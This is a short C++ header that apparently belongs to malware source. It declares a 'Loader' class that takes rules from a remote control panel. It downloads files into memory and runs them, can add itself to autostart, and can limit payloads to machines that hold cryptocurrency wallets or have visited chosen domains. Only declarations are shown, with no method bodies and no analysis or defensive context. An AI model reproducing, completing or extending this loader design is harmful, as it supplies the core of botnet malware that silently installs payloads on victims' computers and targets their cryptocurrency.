#pragma once
struct LoaderRule
{
	string url;
	string args;
	vector<string> onlyDomains;
	bool cryptoOnly;
	bool addAutoStart;
	unsigned short id;
	bool active;
};

class Loader
{
private:
	vector<LoaderRule> rules;

	string panelLink;
	DWORD panelPort;
public:
	Loader(string panel, const DWORD port)
	{
		panelLink = panel;
		panelPort = port;
	}

	bool GetRules(string response);
	void ProcessDomains(const vector<string> & hashes);
	void DownloadFileToMem(string link, string& data);
	void RunSuccess(string ruleId);
	void DownloadExecute(bool cryptoWallet);
};